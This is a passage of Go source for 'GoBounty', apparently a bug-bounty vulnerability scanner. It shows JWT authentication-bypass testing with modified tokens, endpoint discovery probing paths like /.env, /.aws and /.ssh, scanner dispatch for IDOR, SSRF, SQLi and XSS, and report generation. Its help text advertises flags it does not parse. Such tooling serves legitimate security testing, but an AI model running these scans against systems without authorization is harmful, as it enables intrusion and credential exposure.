                Method: "GET",
                Headers: map[string]string{
                    "Authorization": "Bearer " + modifiedToken,
                },
                MaxRetries: 1,
            }

            resp, _, err := s.doRequest(ctx, client, req)
            if err != nil {
                continue
            }

            if test.check(resp) {
                results <- Vulnerability{
                    ID:         uuid.New().String(),
                    Timestamp:  time.Now(),
                    Type:       "JWT Vulnerability",
                    Name:       test.name + " JWT Bypass",
                    URL:        s.config.TargetURL,
                    Method:     "GET",
                    StatusCode: resp.StatusCode,
                    Severity:   "Critical",
                    Confidence: "High",
                    Description: fmt.Sprintf("The application accepts JWT with %s, allowing authentication bypass.", test.name),
                    Remediation: "Use strong secrets. Disable 'none' algorithm. Validate all JWT claims.",
                    Evidence:   fmt.Sprintf("Modified token: %s", modifiedToken[:min(50, len(modifiedToken))]),
                    CWE:        "CWE-347",
                    CVSS:       9.1,
                }
            }

            time.Sleep(time.Duration(s.config.RateLimit) * time.Second)
        }

        close(results)
    }()

    return results
}

func (s *JWTScanner) doRequest(ctx context.Context, client *HTTPClient, req *Request) (*http.Response, []byte, error) {
    httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, nil)
    if err != nil {
        return nil, nil, err
    }

    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }

    resp, err := client.client.Do(httpReq)
    if err != nil {
        return nil, nil, err
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    return resp, body, err
}

// ========== ENDPOINT DISCOVERY ==========
type EndpointDiscovery struct {
    clientPool *ClientPool
    config     Config
}

func (ed *EndpointDiscovery) Discover(ctx context.Context, wordlistPath string) <-chan string {
    results := make(chan string, 100)

    // Common endpoints if no wordlist
    endpoints := []string{
        "/api/v1/users", "/api/users", "/v1/users", "/users",
        "/api/v1/admin", "/api/admin", "/v1/admin", "/admin",
        "/api/v1/profile", "/api/profile", "/profile",
        "/api/v1/account", "/api/account", "/account",
        "/api/v1/settings", "/api/settings", "/settings",
        "/api/v1/config", "/api/config", "/config",
        "/api/v1/data", "/api/data", "/data",
        "/api/v1/files", "/api/files", "/files",
        "/api/v1/upload", "/api/upload", "/upload",
        "/api/v1/download", "/api/download", "/download",
        "/api/v1/search", "/api/search", "/search",
        "/api/v1/query", "/api/query", "/query",
        "/api/v1/graphql", "/graphql", "/graphiql",
        "/api/v1/swagger", "/swagger", "/api-docs",
        "/api/v1/health", "/health", "/healthcheck",
        "/api/v1/metrics", "/metrics", "/stats",
        "/api/v1/backup", "/backup", "/backups",
        "/api/v1/export", "/export", "/exports",
        "/api/v1/import", "/import", "/imports",
        "/api/v1/logs", "/logs", "/logging",
        "/api/v1/debug", "/debug", "/_debug",
        "/api/v1/test", "/test", "/testing",
        "/api/v1/version", "/version", "/ver",
        "/.git", "/.env", "/.aws", "/.ssh",
        "/vendor", "/node_modules", "/tmp",
    }

    // Load from wordlist if provided
    if wordlistPath != "" {
        file, err := os.Open(wordlistPath)
        if err == nil {
            defer file.Close()
            scanner := bufio.NewScanner(file)
            for scanner.Scan() {
                endpoint := strings.TrimSpace(scanner.Text())
                if endpoint != "" {
                    endpoints = append(endpoints, endpoint)
                }
            }
        }
    }

    go func() {
        bar := progressbar.NewOptions(len(endpoints),
            progressbar.OptionSetDescription("Discovering endpoints"),
            progressbar.OptionShowCount(),
            progressbar.OptionShowIts(),
            progressbar.OptionSetTheme(progressbar.Theme{
                Saucer:        "=",
                SaucerHead:    ">",
                SaucerPadding: " ",
                BarStart:      "[",
                BarEnd:        "]",
            }))

        for _, endpoint := range endpoints {
            select {
            case <-ctx.Done():
                close(results)
                return
            default:
            }

            targetURL := ed.config.TargetURL + endpoint

            idx := atomic.AddUint64(&ed.clientPool.index, 1) % uint64(len(ed.clientPool.clients))
            client := ed.clientPool.clients[idx]
            
            req := &Request{
                URL:    targetURL,
                Method: "HEAD", // HEAD is faster than GET
                MaxRetries: 1,
            }

            resp, _, err := ed.doRequest(ctx, client, req)
            bar.Add(1)

            if err == nil && resp.StatusCode < 400 {
                results <- targetURL
                color.Green("[+] Found: %s", targetURL)
            }

            time.Sleep(time.Duration(ed.config.RateLimit) * time.Second)
        }

        bar.Finish()
        close(results)
    }()

    return results
}

func (ed *EndpointDiscovery) doRequest(ctx context.Context, client *HTTPClient, req *Request) (*http.Response, []byte, error) {
    httpReq, err := http.NewRequestWithContext(ctx, req.Method, req.URL, nil)
    if err != nil {
        return nil, nil, err
    }

    for k, v := range req.Headers {
        httpReq.Header.Set(k, v)
    }

    resp, err := client.client.Do(httpReq)
    if err != nil {
        return nil, nil, err
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    return resp, body, err
}

// ========== REPORT GENERATOR ==========
type ReportGenerator struct {
    outputDir string
}

func NewReportGenerator(outputDir string) *ReportGenerator {
    os.MkdirAll(outputDir, 0755)
    return &ReportGenerator{outputDir: outputDir}
}

func (rg *ReportGenerator) Generate(results *ScanResult) error {
    timestamp := time.Now().Format("20060102_150405")
    baseName := fmt.Sprintf("%s/scan_%s", rg.outputDir, timestamp)

    // JSON Report
    jsonFile := baseName + ".json"
    if err := rg.generateJSON(jsonFile, results); err != nil {
        return err
    }
    color.Green("[+] JSON report: %s", jsonFile)

    // CSV Report
    csvFile := baseName + ".csv"
    if err := rg.generateCSV(csvFile, results); err != nil {
        return err
    }
    color.Green("[+] CSV report: %s", csvFile)

    // Markdown Report
    mdFile := baseName + ".md"
    if err := rg.generateMarkdown(mdFile, results); err != nil {
        return err
    }
    color.Green("[+] Markdown report: %s", mdFile)

    // HTML Report
    htmlFile := baseName + ".html"
    if err := rg.generateHTML(htmlFile, results); err != nil {
        return err
    }
    color.Green("[+] HTML report: %s", htmlFile)

    return nil
}

func (rg *ReportGenerator) generateJSON(filename string, results *ScanResult) error {
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    encoder := json.NewEncoder(file)
    encoder.SetIndent("", "  ")
    return encoder.Encode(results)
}

func (rg *ReportGenerator) generateCSV(filename string, results *ScanResult) error {
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    writer := csv.NewWriter(file)
    defer writer.Flush()

    // Header
    writer.Write([]string{
        "Timestamp", "Type", "Name", "URL", "Method",
        "Status", "Severity", "Confidence", "CWE", "CVSS",
    })

    // Data
    for _, vuln := range results.Vulnerabilities {
        writer.Write([]string{
            vuln.Timestamp.Format(time.RFC3339),
            vuln.Type,
            vuln.Name,
            vuln.URL,
            vuln.Method,
            strconv.Itoa(vuln.StatusCode),
            vuln.Severity,
            vuln.Confidence,
            vuln.CWE,
            fmt.Sprintf("%.1f", vuln.CVSS),
        })
    }

    return nil
}

func (rg *ReportGenerator) generateMarkdown(filename string, results *ScanResult) error {
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    fmt.Fprintf(file, "# Bug Bounty Scan Report\n\n")
    fmt.Fprintf(file, "**Target**: `%s`\n\n", results.Target)
    fmt.Fprintf(file, "**Scan Date**: %s\n\n", results.StartTime.Format("2006-01-02 15:04:05"))
    fmt.Fprintf(file, "**Duration**: %s\n\n", results.Duration)
    fmt.Fprintf(file, "**Total Requests**: %d\n\n", results.TotalRequests)
    fmt.Fprintf(file, "**Vulnerabilities Found**: %d\n\n", len(results.Vulnerabilities))

    if len(results.Vulnerabilities) > 0 {
        fmt.Fprintf(file, "## 🔥 Vulnerabilities Found\n\n")

        for i, vuln := range results.Vulnerabilities {
            fmt.Fprintf(file, "### %d. %s (%s)\n\n", i+1, vuln.Name, vuln.Severity)
            fmt.Fprintf(file, "- **Type**: %s\n", vuln.Type)
            fmt.Fprintf(file, "- **URL**: `%s %s`\n", vuln.Method, vuln.URL)
            fmt.Fprintf(file, "- **Status Code**: %d\n", vuln.StatusCode)
            fmt.Fprintf(file, "- **Confidence**: %s\n", vuln.Confidence)
            fmt.Fprintf(file, "- **CWE**: %s\n", vuln.CWE)
            fmt.Fprintf(file, "- **CVSS**: %.1f\n\n", vuln.CVSS)
            fmt.Fprintf(file, "**Description**:\n%s\n\n", vuln.Description)
            fmt.Fprintf(file, "**Remediation**:\n%s\n\n", vuln.Remediation)
            fmt.Fprintf(file, "**Evidence**:\n```\n%s\n```\n\n", vuln.Evidence)
            if vuln.Payload != "" {
                fmt.Fprintf(file, "**Payload**:\n```\n%s\n```\n\n", vuln.Payload)
            }
        }
    } else {
        fmt.Fprintf(file, "## ✅ No Vulnerabilities Found\n\n")
    }

    return nil
}

func (rg *ReportGenerator) generateHTML(filename string, results *ScanResult) error {
    file, err := os.Create(filename)
    if err != nil {
        return err
    }
    defer file.Close()

    fmt.Fprintf(file, `<!DOCTYPE html>
<html>
<head>
    <title>Bug Bounty Scan Report - %s</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #f8f9fa; }
        h1 { color: #343a40; border-bottom: 3px solid #007bff; padding-bottom: 10px; }
        .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 30px 0; }
        .stat-card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .stat-value { font-size: 28px; font-weight: bold; color: #007bff; }
        .stat-label { color: #6c757d; margin-top: 5px; }
        .vuln-card { background: white; padding: 20px; margin: 20px 0; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-left: 5px solid #ccc; }
        .severity-Critical { border-left-color: #dc3545; }
        .severity-High { border-left-color: #fd7e14; }
        .severity-Medium { border-left-color: #ffc107; }
        .severity-Low { border-left-color: #28a745; }
        .badge { display: inline-block; padding: 3px 8px; border-radius: 3px; color: white; font-size: 12px; font-weight: bold; }
        .badge-Critical { background: #dc3545; }
        .badge-High { background: #fd7e14; }
        .badge-Medium { background: #ffc107; color: #212529; }
        .badge-Low { background: #28a745; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 5px; overflow-x: auto; }
        table { width: 100%%; border-collapse: collapse; margin: 20px 0; }
        th { background: #007bff; color: white; padding: 10px; text-align: left; }
        td { padding: 10px; border-bottom: 1px solid #dee2e6; }
        tr:hover { background: #f8f9fa; }
    </style>
</head>
<body>
    <h1>🔍 Bug Bounty Scan Report</h1>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-value">%d</div>
            <div class="stat-label">Total Requests</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">%d</div>
            <div class="stat-label">Vulnerabilities</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">%s</div>
            <div class="stat-label">Duration</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">%s</div>
            <div class="stat-label">Target</div>
        </div>
    </div>
    
    <h2>🎯 Target Information</h2>
    <table>
        <tr><th>Property</th><th>Value</th></tr>
        <tr><td>Target URL</td><td>%s</td></tr>
        <tr><td>Scan Start</td><td>%s</td></tr>
        <tr><td>Scan End</td><td>%s</td></tr>
        <tr><td>Duration</td><td>%s</td></tr>
    </table>
    
    <h2>🔥 Vulnerabilities Found</h2>
`, results.Target, results.TotalRequests, len(results.Vulnerabilities), 
   results.Duration, results.Target, results.Target,
   results.StartTime.Format("2006-01-02 15:04:05"),
   results.EndTime.Format("2006-01-02 15:04:05"),
   results.Duration)

    if len(results.Vulnerabilities) > 0 {
        fmt.Fprintf(file, `<table>
    <tr>
        <th>Severity</th>
        <th>Type</th>
        <th>Name</th>
        <th>URL</th>
        <th>Method</th>
        <th>Status</th>
        <th>CWE</th>
        <th>CVSS</th>
    </tr>`)

        for _, vuln := range results.Vulnerabilities {
            fmt.Fprintf(file, `
    <tr>
        <td><span class="badge badge-%s">%s</span></td>
        <td>%s</td>
        <td>%s</td>
        <td>%s</td>
        <td>%s</td>
        <td>%d</td>
        <td>%s</td>
        <td>%.1f</td>
    </tr>`, vuln.Severity, vuln.Severity, vuln.Type, vuln.Name, 
                vuln.URL, vuln.Method, vuln.StatusCode, vuln.CWE, vuln.CVSS)
        }
        fmt.Fprintf(file, "</table>\n\n")

        // Detailed vulnerabilities
        for _, vuln := range results.Vulnerabilities {
            fmt.Fprintf(file, `
    <div class="vuln-card severity-%s">
        <h3>%s</h3>
        <p><strong>Type:</strong> %s</p>
        <p><strong>URL:</strong> <code>%s %s</code></p>
        <p><strong>Severity:</strong> <span class="badge badge-%s">%s</span></p>
        <p><strong>Confidence:</strong> %s</p>
        <p><strong>CWE:</strong> %s</p>
        <p><strong>CVSS:</strong> %.1f</p>
        
        <h4>Description</h4>
        <p>%s</p>
        
        <h4>Remediation</h4>
        <p>%s</p>
        
        <h4>Evidence</h4>
        <pre>%s</pre>
`, vuln.Severity, vuln.Name, vuln.Type, vuln.Method, vuln.URL,
                vuln.Severity, vuln.Severity, vuln.Confidence, vuln.CWE,
                vuln.CVSS, vuln.Description, vuln.Remediation, vuln.Evidence)

            if vuln.Payload != "" {
                fmt.Fprintf(file, `
        <h4>Payload</h4>
        <pre>%s</pre>
`, vuln.Payload)
            }
            fmt.Fprintf(file, "    </div>\n")
        }
    } else {
        fmt.Fprintf(file, "<p>✅ No vulnerabilities were found during this scan.</p>\n")
    }

    fmt.Fprintf(file, `
    <hr>
    <p style="color: #6c757d; text-align: center;">Generated by GoBounty v3.0.0</p>
</body>
</html>`)

    return nil
}

// ========== MAIN APPLICATION ==========
type GoBounty struct {
    config       Config
    clientPool   *ClientPool
    results      *ScanResult
    vulnerabilities []Vulnerability
    mu           sync.Mutex
    startTime    time.Time
    requestCount int64
}

func NewGoBounty(config Config) *GoBounty {
    return &GoBounty{
        config:     config,
        clientPool: NewClientPool(config.MaxWorkers, config),
        results: &ScanResult{
            Vulnerabilities: make([]Vulnerability, 0),
            Errors:          make([]string, 0),
            Stats:           make(map[string]interface{}),
        },
        startTime: time.Now(),
    }
}

func (g *GoBounty) printBanner() {
    banner := `
╔══════════════════════════════════════════════════════════════╗
║                                                             ║
║           GoBounty v1.0.0 - Advanced Bug Bounty Tool        ║
║        IDOR • SSRF • SQLi • XSS • CORS • JWT • Discovery    ║
║             High Performance • Made by @GolDer409           ║
║                                                             ║
╚══════════════════════════════════════════════════════════════╝
`
    color.Cyan(banner)
    color.Red("⚠️  WARNING: For authorized testing only! Unauthorized access is illegal!")
}

func (g *GoBounty) runScan(ctx context.Context, scanType string, args map[string]string) {
    var vulnChan <-chan Vulnerability

    switch scanType {
    case "idor":
        scanner := NewIDORScanner(g.clientPool, g.config)
        endpoint := args["endpoint"]
        userIDs := strings.Split(args["user_ids"], ",")
        methods := strings.Split(args["methods"], ",")
        vulnChan = scanner.Scan(ctx, endpoint, userIDs, methods)

    case "ssrf":
        scanner := &SSRFScanner{
            clientPool: g.clientPool,
            config:     g.config,
        }
        vulnChan = scanner.Scan(ctx, args["param"])

    case "sqli":
        scanner := &SQLInjectionScanner{
            clientPool: g.clientPool,
            config:     g.config,
        }
        vulnChan = scanner.Scan(ctx, args["param"])

    case "xss":
        scanner := &XSSScanner{
            clientPool: g.clientPool,
            config:     g.config,
        }
        vulnChan = scanner.Scan(ctx, args["param"])

    case "cors":
        scanner := &CORSScanner{
            clientPool: g.clientPool,
            config:     g.config,
        }
        vulnChan = scanner.Scan(ctx)

    case "jwt":
        scanner := &JWTScanner{
            clientPool: g.clientPool,
            config:     g.config,
        }
        vulnChan = scanner.Scan(ctx, args["token"])

    case "discover":
        discoverer := &EndpointDiscovery{
            clientPool: g.clientPool,
            config:     g.config,
        }
        
        endpoints := discoverer.Discover(ctx, args["wordlist"])
        go func() {
            for endpoint := range endpoints {
                g.mu.Lock()
                color.Green("[+] Discovered: %s", endpoint)
                g.mu.Unlock()
            }
        }()
        return
    }

    // Collect vulnerabilities
    if vulnChan != nil {
        for vuln := range vulnChan {
            g.mu.Lock()
            g.vulnerabilities = append(g.vulnerabilities, vuln)
            atomic.AddInt64(&g.requestCount, 1)
            g.mu.Unlock()

            // Print to console
            color.Red("\n[🔥] %s Found!", vuln.Type)
            color.Yellow("    URL: %s %s", vuln.Method, vuln.URL)
            color.Yellow("    Severity: %s", vuln.Severity)
            color.Yellow("    Confidence: %s", vuln.Confidence)
            if vuln.Payload != "" {
                color.Yellow("    Payload: %s", vuln.Payload)
            }
            color.White("    %s", vuln.Description)
        }
    }
}

func (g *GoBounty) loadConfigFromFile(filename string) error {
    data, err := os.ReadFile(filename)
    if err != nil {
        return err
    }

    return yaml.Unmarshal(data, &g.config)
}

func (g *GoBounty) saveConfigToFile(filename string) error {
    data, err := yaml.Marshal(g.config)
    if err != nil {
        return err
    }

    return os.WriteFile(filename, data, 0644)
}

func (g *GoBounty) printSummary() {
    color.Cyan("\n" + strings.Repeat("=", 70))
    color.Green("[✓] Scan Completed!")
    color.Yellow("    Duration: %s", time.Since(g.startTime))
    color.Yellow("    Total Requests: %d", atomic.LoadInt64(&g.requestCount))
    color.Yellow("    Vulnerabilities Found: %d", len(g.vulnerabilities))
    
    if len(g.vulnerabilities) > 0 {
        color.Red("\n[!] Vulnerability Summary:")
        
        // Group by severity
        bySeverity := make(map[string]int)
        byType := make(map[string]int)
        
        for _, v := range g.vulnerabilities {
            bySeverity[v.Severity]++
            byType[v.Type]++
        }
        
        // Print by severity
        for _, severity := range []string{"Critical", "High", "Medium", "Low"} {
            if count := bySeverity[severity]; count > 0 {
                switch severity {
                case "Critical":
                    color.Red("    %s: %d", severity, count)
                case "High":
                    color.Red("    %s: %d", severity, count)
                case "Medium":
                    color.Yellow("    %s: %d", severity, count)
                default:
                    color.Green("    %s: %d", severity, count)
                }
            }
        }
        
        // Print by type
        color.Cyan("\n    By Type:")
        for vtype, count := range byType {
            color.White("        %s: %d", vtype, count)
        }
    }
    
    color.Cyan(strings.Repeat("=", 70))
}

// ========== HELPER FUNCTIONS ==========
func injectPayload(targetURL, param, payload string) string {
    parsed, err := url.Parse(targetURL)
    if err != nil {
        return targetURL
    }

    query := parsed.Query()
    if param != "" {
        query.Set(param, payload)
    } else {
        // Inject into all parameters
        for k := range query {
            query.Set(k, payload)
        }
    }

    parsed.RawQuery = query.Encode()
    return parsed.String()
}

func extractDomain(targetURL string) string {
    parsed, err := url.Parse(targetURL)
    if err != nil {
        return targetURL
    }
    return parsed.Hostname()
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

// ========== MAIN ==========
func main() {
    runtime.GOMAXPROCS(runtime.NumCPU())

    // Parse command line arguments
    var config Config = DefaultConfig
    var scanType string
    var endpoint string
    var userIDs string
    var param string
    var jwtToken string
    var wordlist string
    var configFile string
    var methods string = "GET"
    var showHelp bool

    // Simple flag parsing
    args := os.Args[1:]
    for i := 0; i < len(args); i++ {
        switch args[i] {
        case "-u", "--url":
            if i+1 < len(args) {
                config.TargetURL = args[i+1]
                i++
            }
        case "-t", "--token":
            if i+1 < len(args) {
                config.AuthToken = args[i+1]
                i++
            }
        case "--scan":
            if i+1 < len(args) {
                scanType = args[i+1]
                i++
            }
        case "--endpoint":
            if i+1 < len(args) {
                endpoint = args[i+1]
                i++
            }
        case "--user-ids":
            if i+1 < len(args) {
                userIDs = args[i+1]
                i++
            }
        case "--param":
            if i+1 < len(args) {
                param = args[i+1]
                i++
            }
        case "--jwt":
            if i+1 < len(args) {
                jwtToken = args[i+1]
                i++
            }
        case "--wordlist":
            if i+1 < len(args) {
                wordlist = args[i+1]
                i++
            }
        case "--methods":
            if i+1 < len(args) {
                methods = args[i+1]
                i++
            }
        case "--config":
            if i+1 < len(args) {
                configFile = args[i+1]
                i++
            }
        case "--rate-limit":
            if i+1 < len(args) {
                config.RateLimit, _ = strconv.ParseFloat(args[i+1], 64)
                i++
            }
        case "--workers":
            if i+1 < len(args) {
                config.MaxWorkers, _ = strconv.Atoi(args[i+1])
                i++
            }
        case "--timeout":
            if i+1 < len(args) {
                config.Timeout, _ = strconv.Atoi(args[i+1])
                i++
            }
        case "--output":
            if i+1 < len(args) {
                config.OutputDir = args[i+1]
                i++
            }
        case "-h", "--help":
            showHelp = true
        case "-v", "--verbose":
            config.Verbose = true
        }
    }

    if showHelp || (scanType == "" && configFile == "") {
        printHelp()
        return
    }

    // Load config from file if provided
    bounty := NewGoBounty(config)
    if configFile != "" {
        if err := bounty.loadConfigFromFile(configFile); err != nil {
            color.Red("[-] Failed to load config: %v", err)
            return
        }
    }

    bounty.printBanner()

    // Validate target
    if config.TargetURL == "" && scanType != "" {
        color.Red("[-] Target URL required for scanning")
        return
    }

    // Create context with cancel
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    // Handle Ctrl+C
    c := make(chan os.Signal, 1)
    signal.Notify(c, os.Interrupt)
    go func() {
        <-c
        color.Yellow("\n[!] Interrupted, generating report...")
        cancel()
    }()

    // Prepare scan args
    scanArgs := map[string]string{
        "endpoint":  endpoint,
        "user_ids":  userIDs,
        "param":     param,
        "token":     jwtToken,
        "wordlist":  wordlist,
        "methods":   methods,
    }

    // Run scan
    bounty.runScan(ctx, scanType, scanArgs)

    // Wait a bit for all goroutines
    time.Sleep(2 * time.Second)

    // Prepare results
    bounty.results.Target = config.TargetURL
    bounty.results.StartTime = bounty.startTime
    bounty.results.EndTime = time.Now()
    bounty.results.Duration = time.Since(bounty.startTime).String()
    bounty.results.TotalRequests = atomic.LoadInt64(&bounty.requestCount)
    bounty.results.Vulnerabilities = bounty.vulnerabilities

    // Generate report
    if len(bounty.vulnerabilities) > 0 || config.Verbose {
        reporter := NewReportGenerator(config.OutputDir)
        if err := reporter.Generate(bounty.results); err != nil {
            color.Red("[-] Failed to generate report: %v", err)
        }
    }

    // Print summary
    bounty.printSummary()
}

func printHelp() {
    help := `
GoBounty v3.0.0 - Advanced Bug Bounty Tool

USAGE:
    gobounty [OPTIONS] --scan <TYPE> [SCAN_OPTIONS]

SCAN TYPES:
    idor        Insecure Direct Object Reference testing
    ssrf        Server-Side Request Forgery testing
    sqli        SQL Injection testing
    xss         Cross-Site Scripting testing
    cors        CORS misconfiguration testing
    jwt         JWT vulnerability testing
    discover    Endpoint discovery

REQUIRED OPTIONS:
    -u, --url <URL>              Target URL

SCAN OPTIONS:
    --endpoint <PATTERN>          Endpoint pattern for IDOR (e.g., /api/users/{id})
    --user-ids <IDS>              Comma-separated user IDs for IDOR (e.g., 1,2,3,4)
    --param <NAME>                 Parameter name for injection (SSRF, SQLi, XSS)
    --jwt <TOKEN>                  JWT token for testing
    --wordlist <FILE>              Wordlist file for endpoint discovery
    --methods <METHODS>            HTTP methods to test (default: GET)

AUTH OPTIONS:
    -t, --token <TOKEN>            Bearer token for authentication
    --client-id <ID>               OAuth client ID
    --client-secret <SECRET>       OAuth client secret

PERFORMANCE OPTIONS:
    --rate-limit <FLOAT>           Delay between requests (default: 0.5)
    --workers <INT>                 Max concurrent workers (default: 10)
    --timeout <INT>                 Request timeout in seconds (default: 15)

OUTPUT OPTIONS:
    --output <DIR>                  Output directory for reports (default: reports)
    -v, --verbose                    Verbose output
    --config <FILE>                  Load configuration from YAML file

EXAMPLES:
    # IDOR Scan
    gobounty -u https://api.target.com --scan idor --endpoint /api/users/{id} --user-ids 1,2,3,4,5

    # SSRF Scan
    gobounty -u https://target.com/webhook --scan ssrf --param url

    # SQL Injection Scan
    gobounty -u https://target.com/search --scan sqli --param q

    # XSS Scan
    gobounty -u https://target.com/search --scan xss --param q

    # CORS Scan
    gobounty -u https://target.com/api --scan cors

    # JWT Scan
    gobounty -u https://target.com/api --scan jwt --jwt "eyJhbGciOiJIUzI1NiIs..."

    # Endpoint Discovery
    gobounty -u https://target.com --scan discover --wordlist endpoints.txt

    # Full scan with custom config
    gobounty -u https://target.com --scan all --token "your-token" --workers 20 --rate-limit 0.1

    # Load config from file
    gobounty --config scan-config.yaml
`
    fmt.Print(help)
}
